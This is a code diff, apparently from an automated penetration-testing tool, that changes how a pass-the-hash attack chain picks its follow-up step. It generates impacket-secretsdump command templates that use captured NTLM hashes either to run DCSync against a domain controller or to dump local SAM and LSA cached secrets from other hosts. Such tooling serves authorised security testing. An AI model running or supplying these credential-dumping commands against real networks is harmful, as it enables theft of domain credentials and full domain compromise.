@@ -402,12 +402,26 @@ def run(report, store, ui=None):
         # iter-24: drop literal '<DOMAIN>' when we've learned a real domain
         # from BloodHound / NTDS / netexec_db; otherwise keep the placeholder.
         _dom_r7 = store.dominant_domain() or "<dom>"
+        # iter-76: -just-dc only works when tgt IS the DC (impacket triggers
+        # DCSync via DRSUAPI, which requires target = DC replication endpoint).
+        # If tgt is a non-DC domain host, the second command was previously
+        # wasted breath - swap to a useful post-Pwn3d hint (dump SAM+SYSTEM
+        # for local hashes; LSASecret / cached creds for domain fallback).
+        _tgt_is_dc = best_prox >= 1.0
+        if local_origin:
+            _r7_follow = ("# DCSync NOT available with LOCAL SAM hashes; "
+                          "gather domain creds first")
+        elif _tgt_is_dc:
+            _r7_follow = (f"impacket-secretsdump -hashes :{h0} "
+                          f"{_dom_r7}/'{u}'@{tgt} -just-dc   # if (Pwn3d!)")
+        else:
+            _r7_follow = (f"impacket-secretsdump -hashes :{h0} "
+                          f"{_dom_r7}/'{u}'@{tgt}   "
+                          f"# if (Pwn3d!) - dumps LOCAL SAM + LSA cached "
+                          f"secrets; DCSync requires DC target")
         chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
             crit=10, conf=0.85, ready=1.5, prox=best_prox,
-            commands=[cmd_pth,
-                      (f"impacket-secretsdump -hashes :{h0} {_dom_r7}/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"
-                       if not local_origin else
-                       f"# DCSync NOT available with LOCAL SAM hashes; gather domain creds first")],
+            commands=[cmd_pth, _r7_follow],
             src=src0, line=ln0, count=n))
         # winrm PtH only when that machine actually exposes winrm
         wh = None
